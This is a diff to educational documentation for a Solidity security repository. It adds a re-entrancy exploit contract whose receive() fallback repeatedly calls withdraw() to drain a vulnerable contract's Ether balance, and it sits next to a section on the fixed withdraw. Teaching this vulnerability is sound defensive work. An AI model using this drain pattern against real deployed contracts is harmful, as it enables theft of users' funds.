@@ -45,6 +45,35 @@ Every time an interaction is made, the cycle starts again.
     }
 ```
 
+### ReEntrancy Exploit
+
+[Git Source](https://github.com/Dom-Mac/solspace/blob/f5838bdc64c22456cef26721eb6148f05fc8f839/src/ReEntrancy/ReEntrancyExploit.sol)
+
+Contract to exploit the vulnerable contract, it can be used to drain the contract balance.
+The receive function, fired on plain Ether transfers, is used to trigger the re-entrancy attack.
+
+```solidity
+ /**
+     * @dev Function to attack target contract
+     */
+    function exploit() external payable {
+        require(msg.value >= 1 ether);
+        target.deposit{value: 1 ether}();
+        target.withdraw();
+    }
+
+    /**
+     * @dev Function executed on plain Ether transfers
+     */
+    receive() external payable {
+        if (
+            address(target).balance >= 1 ether
+        ) {
+            target.withdraw();
+        }
+    }
+```
+
 ### Fixed withdraw
 
 [Git Source](https://github.com/Dom-Mac/solspace/blob/f5838bdc64c22456cef26721eb6148f05fc8f839/src/ReEntrancy/ReEntrancyProof.sol)
